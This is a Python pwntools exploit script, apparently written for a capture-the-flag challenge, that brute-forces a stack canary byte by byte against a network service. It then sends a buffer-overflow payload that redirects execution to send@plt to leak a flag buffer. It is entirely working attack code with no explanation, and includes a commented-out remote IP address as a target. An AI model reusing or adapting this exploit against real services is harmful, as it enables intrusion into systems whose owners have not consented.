from pwn import *
context(log_level="debug")
#p = remote('127.0.0.1',5555)

def find():
	cancary = ''
	while len(cancary) <= 8:
		for x in range(0,0xff):
			try:
			
				p = remote('127.0.0.1',5555)
				#p = remote('218.2.197.234',2090)
				p.recvuntil("Welcome!\n")
				# p.send("a"*376+p64(0x602160))
				p.send("a"*104+cancary+chr(x))
				p.recv(1,timeout=3)
				cancary=cancary+chr(x)
				if(len(cancary)==8):
					return cancary

				print len(cancary),cancary
			except:
				p.close()
				continue


#cancary=find()
cancary = '\x00\x6e\xfa\xbc\xb0\xd5\x18\x5d'
puts_plt = 0x400910
printf_plt = 0x400960
flag_bbs = 0x602160
send_plt = 0x400950
p = remote('127.0.0.1',5555)
#p = remote('218.2.197.234',2090)
payload = ''
payload += "a"*104+cancary
payload += p64(send_plt)
payload +=p64(0)
payload += p64(0x602120)   #fd
payload += p64(flag_bbs)   
payload += p64(0x64)     
payload += p64(0)
p.send(payload)
p.interactive()

